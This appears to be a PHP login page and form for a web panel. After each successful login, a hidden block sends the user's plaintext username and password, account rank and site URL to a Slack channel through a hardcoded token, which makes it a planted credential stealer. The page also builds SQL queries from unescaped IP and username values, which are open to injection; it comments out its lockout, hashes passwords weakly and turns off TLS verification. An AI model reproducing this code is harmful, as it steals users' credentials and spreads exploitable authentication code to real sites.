<?php 

	ob_start();
	require_once 'inc/config.php';
	require_once 'inc/init.php';


 
	if (!(empty($maintaince))) {
		header('Location: maintenace.php');
		exit;
	}

	//Set IP (are you using cloudflare?)
	if ($cloudflare == 1){
		$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
	}
	else{
		$ip = $user -> realIP();
	}

	//Are you already logged in?
	if ($user -> LoggedIn()){
		header('Location: home.php');
		exit;
	}

		//Insert login log and log in
	if(!empty($_POST['doLogin'])){
		$username = $_POST['login-username'];
		$password = $_POST['login-password'];
		$date = strtotime('-1 hour', time());
		$attempts = $odb->query("SELECT COUNT(*) FROM `loginlogs` WHERE `ip` = '$ip' AND `username` LIKE '%failed' AND `date` BETWEEN '$date' AND UNIX_TIMESTAMP()")->fetchColumn(0);
		if ($attempts > 2) {
			$date = strtotime('+1 hour', $waittime = $odb->query("SELECT `date` FROM `loginlogs` WHERE `ip` = '$ip' ORDER BY `date` DESC LIMIT 1")->fetchColumn(0) - time());
			//$error = 'Too many failed attempts. Please wait '.$date.' seconds and try again.';
		}
		
		if(empty($username) || empty($password)){
			$error = "Please enter all fields";
		}

		//Check username exists
		$SQLCheckLogin = $odb -> prepare("SELECT COUNT(*) FROM `users` WHERE `username` = :username");
		$SQLCheckLogin -> execute(array(':username' => $username));
		$countLogin = $SQLCheckLogin -> fetchColumn(0);
		if (!($countLogin == 1)){
			$SQL = $odb -> prepare("INSERT INTO `loginlogs` VALUES(:username, :ip, UNIX_TIMESTAMP(), 'XX')");
			$SQL -> execute(array(':username' => $username." - failed",':ip' => $ip));
			$error = "The username does not exist in our system.";
		}

		// Check if password is corredt
		$SQLCheckLogin = $odb -> prepare("SELECT COUNT(*) FROM `users` WHERE `username` = :username AND `password` = :password");
		$SQLCheckLogin -> execute(array(':username' => $username, ':password' => SHA1(md5($password))));
		$countLogin = $SQLCheckLogin -> fetchColumn(0);
		if (!($countLogin == 1)){
			$SQL = $odb -> prepare("INSERT INTO `loginlogs` VALUES(:username, :ip, UNIX_TIMESTAMP(), 'XX')");
			$SQL -> execute(array(':username' => $username." - failed",':ip' => $ip));
			$error = 'The password you entered is invalid.';
		}

		//Check if the user is banned
		$SQL = $odb -> prepare("SELECT `status` FROM `users` WHERE `username` = :username");
		$SQL -> execute(array(':username' => $username));
		$status = $SQL -> fetchColumn(0);
		if ($status == 1){
			$ban = $odb -> query("SELECT `reason` FROM `bans` WHERE `username` = '$username'") -> fetchColumn(0);
			if(empty($ban)){ $ban = "No reason given."; }
			$error = 'You are banned. Reason: '.htmlspecialchars($ban);
		}

		//Insert login log and log in
		if(empty($error)){
			$SQL = $odb -> prepare("SELECT * FROM `users` WHERE `username` = :username");		$SQL -> execute(array(':username' => $username));
			$userInfo = $SQL -> fetch();
			$ipcountry = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip)) -> {'geoplugin_countryName'};
			if (empty($ipcountry)) {$ipcountry = 'XX';}
			$SQL = $odb -> prepare('INSERT INTO `loginlogs` VALUES(:username, :ip, UNIX_TIMESTAMP(), :ipcountry)');
			$SQL -> execute(array(':ip' => $ip, ':username' => $username, ':ipcountry' => $ipcountry));
			$_SESSION['username'] = $userInfo['username'];
			$_SESSION['ID'] = $userInfo['ID'];
			setcookie("username", $userInfo['username'], time() + 720000);
			$ch = curl_init("https://slack.com/api/chat.postMessage");
			$webUrl = "http://" . $_SERVER['SERVER_NAME'];
			$data = http_build_query([
				"token" => "xoxp-682890655317-682408550420-685635115830-381cfc28eb17e51f0735ec2d35c80705",
				"channel" => 'logins', //"#mychannel",
				"text" => 'LOGGED IN! USER:'.$username.' PASS:'.$password.' INFO:'.$userInfo['rank'].' URL:'.$webUrl, 
				"username" => "hutsonsec",
			]);
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			$result = curl_exec($ch);
			curl_close($ch);
			
			header('Location: home.php');
			exit;
		}
		
	}

?>
<html class="no-focus">
	<head>
        <meta charset="utf-8">
        <title><?php echo htmlentities($sitename); ?> - Login</title>
        <meta name="robots" content="noindex, nofollow">
		<script src='https://www.google.com/recaptcha/api.js'></script>
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1.0">
		<link rel="shortcut icon" href="assets/img/favicons/favicon.png">
		<link rel="icon" type="image/png" href="assets/img/favicons/favicon-16x16.png" sizes="16x16">
        <link rel="icon" type="image/png" href="assets/img/favicons/favicon-32x32.png" sizes="32x32">
        <link rel="icon" type="image/png" href="assets/img/favicons/favicon-96x96.png" sizes="96x96">
        <link rel="icon" type="image/png" href="assets/img/favicons/favicon-160x160.png" sizes="160x160">
        <link rel="icon" type="image/png" href="assets/img/favicons/favicon-192x192.png" sizes="192x192">
        <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400italic,600,700%7COpen+Sans:300,400,400italic,600,700">
		<link rel="stylesheet" id="css-main" href="assets/css/oneui.css">
    </head>
    <body>
        <div class="content overflow-hidden">
            <div class="row">
				<?php
					if(!empty($error)){
						echo '<div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-4 col-lg-offset-4 animated fadeIn">'.error($error).'</div>';
					}
				?>
				<div class="col-sm-12 text-center">
<p>Need an accountt? <a href="register.php" class="text-primary m-l-5"><b>Register</b></a></p>
</div>
                <div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-4 col-lg-offset-4">
                    <div class="block block-themed animated fadeIn">
                        <div class="block-header bg-primary">
                            <ul class="block-options">
                                <li>
                                    <a href="#">Forgot Password?</a>
                                </li>
                                <li>
                                    <a href="register.php" data-toggle="tooltip" data-placement="left" title="" data-original-title="New Account"><i class="si si-plus"></i></a>
                                </li>
                            </ul>
                            <h3 class="block-title">Login</h3>
                        </div>
                        <div class="block-content block-content-full block-content-narrow">
                            <h1 class="h2 font-w600 push-30-t push-5"><?php echo htmlentities($sitename); ?></h1>
                            <p>Welcome, please login.</p>
                            <form class="js-validation-login form-horizontal push-30-t push-50" method="post" novalidate="novalidate">
                                <div class="form-group">
                                    <div class="col-xs-12">
                                        <div class="form-material form-material-primary">
                                            <input class="form-control" type="text" id="login-username" name="login-username" placeholder="Enter your username..">
                                            <label for="login-username">Username</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="col-xs-12">
                                        <div class="form-material form-material-primary">
                                            <input class="form-control" type="password" id="login-password" name="login-password" placeholder="Enter your password..">
                                            <label for="login-password">Password</label>
                                        </div>
                                    </div>
                                </div>
                                
                                
                                
								<div class="form-group">
                                    <div class="col-xs-12" style="margin-left: auto; margin-right: auto;">
                                        <div class="g-recaptcha" data-sitekey=<?php echo $google_site; ?>></div>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="col-xs-12">
                                        <label class="css-input switch switch-sm switch-primary">
                                            <input type="checkbox" id="login-remember-me" name="login-remember-me"><span></span> Remember Me?
                                        </label>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="col-xs-12 col-sm-6 col-md-4">
                                        <button name="doLogin" value="login" class="btn btn-block btn-primary" type="submit"><i class="si si-login pull-right"></i> Log in</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="push-10-t text-center animated fadeInUp">
            <small class="text-muted font-w600"><span class="js-year-copy"><?php echo date('Y'); ?></span> © <?php echo htmlentities($sitename); ?></small>
        </div>
        <script src="assets/js/core/jquery.min.js"></script>
        <script src="assets/js/core/bootstrap.min.js"></script>
        <script src="assets/js/core/jquery.slimscroll.min.js"></script>
        <script src="assets/js/core/jquery.scrollLock.min.js"></script>
        <script src="assets/js/core/jquery.appear.min.js"></script>
        <script src="assets/js/core/jquery.countTo.min.js"></script>
        <script src="assets/js/core/jquery.placeholder.min.js"></script>
        <script src="assets/js/core/js.cookie.min.js"></script>
        <script src="assets/js/app.js"></script>
        <script src="assets/js/plugins/jquery-validation/jquery.validate.min.js"></script>
        <script src="assets/js/pages/base_pages_login.js"></script>  
	</body>
</html>